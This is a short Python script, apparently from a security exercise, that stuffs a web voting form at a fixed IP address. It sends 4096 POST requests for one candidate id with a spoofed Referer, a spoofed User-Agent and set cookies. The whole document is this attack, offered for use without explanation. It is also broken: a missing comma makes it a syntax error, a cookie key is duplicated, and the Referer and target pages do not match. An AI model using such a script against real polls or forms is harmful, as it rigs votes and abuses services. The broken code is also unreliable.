#!/usr/bin/python3
import requests


header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://158.69.76.135/level2.php",
    "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0WOW64 rv: 44.0) Gecko/20100101 Firefox/44.0",
}

payload = {
    'id': 1651,
    'holdthedoor':'Submit',
    'key':'0'
}

cookie = {
    'Max-Age':'0',
    'Max-Age':'0', 
    'HoldTheDoor':'0'
}
URL = 'http://158.69.76.135/level1.php'
votes = 0

while votes < 4096:
    r = requests.post(URL, data=payload, headers=header cookies=cookie)
    votes += 1
    print("Votes: {}".format(votes))
